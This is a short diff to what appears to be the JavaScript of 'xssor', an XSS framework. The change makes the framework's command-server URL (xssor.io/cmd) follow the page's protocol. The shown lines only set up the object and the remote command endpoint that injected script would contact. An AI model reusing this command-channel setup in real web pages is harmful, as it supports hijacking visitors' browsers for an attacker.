@@ -1,6 +1,6 @@
 /*xssor.io*/
 xssor = {};
-xssor.cmd_url = 'http://xssor.io/cmd';
+xssor.cmd_url = location.protocol + '//xssor.io/cmd';
 xssor.gone = 0;
 xssor.done = 0;
 
